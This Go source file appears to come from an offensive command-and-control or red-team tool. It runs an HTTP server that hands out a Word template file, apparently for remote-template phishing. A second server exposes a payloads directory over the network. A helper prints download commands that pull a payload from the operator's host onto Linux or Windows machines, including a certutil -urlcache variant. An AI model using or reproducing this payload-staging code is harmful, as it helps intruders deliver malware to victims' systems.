package main

import (
	"context"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

func startTemplateServer(templateData []byte, filename string) {
	templateServer.Mutex.Lock()
	defer templateServer.Mutex.Unlock()

	if templateServer.Running {
		stopTemplateServer()
	}

	templateServer.Template = templateData
	templateServer.Filename = filename

	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/vnd.ms-word.template")
		w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", filename))
		w.Write(templateData)
	})

	templateServer.Server = &http.Server{
		Addr:    ":8080",
		Handler: mux,
	}
	templateServer.Running = true

	go func() {
		if err := templateServer.Server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			fmt.Printf("%s[!] Template server error: %v%s\n", ColorRed, err, ColorReset)
		}
	}()
}

func stopTemplateServer() {
	templateServer.Mutex.Lock()
	defer templateServer.Mutex.Unlock()

	if !templateServer.Running || templateServer.Server == nil {
		return
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	templateServer.Server.Shutdown(ctx)
	templateServer.Running = false
	templateServer.Server = nil
	templateServer.Template = nil

	fmt.Printf("%s[*] Template server stopped%s\n", ColorBlue, ColorReset)
}

func startFileServer(publicIP string) {
	fileServer.Mutex.Lock()
	defer fileServer.Mutex.Unlock()

	if fileServer.Running {
		fmt.Printf("%s[!] File server already running on port %s%s\n", ColorYellow, fileServer.Port, ColorReset)
		return
	}

	if publicIP != "" {
		fileServer.PublicIP = publicIP
	}

	mux := http.NewServeMux()
	fs := http.FileServer(http.Dir(payloadsDir))

	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/" {
			http.NotFound(w, r)
			return
		}
		fs.ServeHTTP(w, r)
	})

	fileServer.Server = &http.Server{
		Addr:    ":" + fileServer.Port,
		Handler: mux,
	}
	fileServer.Running = true

	displayIP := fileServer.PublicIP
	if displayIP == "" {
		displayIP = getLocalIP()
	}

	go func() {
		fmt.Printf("%s[*] File server started — http://%s:%s/%s\n", ColorGreen, displayIP, fileServer.Port, ColorReset)
		refreshPrompt()
		if err := fileServer.Server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			fmt.Printf("%s[!] File server error: %v%s\n", ColorRed, err, ColorReset)
			refreshPrompt()
		}
	}()
}

func stopFileServer() {
	fileServer.Mutex.Lock()
	defer fileServer.Mutex.Unlock()

	if !fileServer.Running || fileServer.Server == nil {
		return
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	fileServer.Server.Shutdown(ctx)
	fileServer.Running = false
	fileServer.Server = nil

	fmt.Printf("%s[*] File server stopped%s\n", ColorBlue, ColorReset)
}

func getFileCommand(filename string) {
	filePath := filepath.Join(payloadsDir, filename)
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		fmt.Printf("%s[!] File not found in %s/: %s%s\n", ColorRed, payloadsDir, filename, ColorReset)
		return
	}

	ip := fileServer.PublicIP
	if ip == "" {
		ip = getLocalIP()
	}
	url := fmt.Sprintf("http://%s:%s/%s", ip, fileServer.Port, filename)

	fmt.Printf("\n%s╔══════════════════════════════════════════════════════════════╗%s\n", ColorCyan, ColorReset)
	fmt.Printf("%s║                     Download Commands                         ║%s\n", ColorCyan, ColorReset)
	fmt.Printf("%s╠══════════════════════════════════════════════════════════════╣%s\n", ColorCyan, ColorReset)
	fmt.Printf("  %sURL:%s     %s\n", ColorYellow, ColorReset, url)
	fmt.Printf("  %sFile:%s    %s\n\n", ColorYellow, ColorReset, filename)
	fmt.Printf("  %sLinux/Mac (curl):%s\n", ColorBlue, ColorReset)
	fmt.Printf("  curl -O %s\n\n", url)
	fmt.Printf("  %sWindows (PowerShell):%s\n", ColorBlue, ColorReset)
	fmt.Printf("  Invoke-WebRequest -Uri %s -OutFile %s\n\n", url, filename)
	fmt.Printf("  %sWindows (certutil):%s\n", ColorBlue, ColorReset)
	fmt.Printf("  certutil -urlcache -f %s %s\n", url, filename)
	fmt.Printf("%s╚══════════════════════════════════════════════════════════════╝%s\n\n", ColorCyan, ColorReset)
}
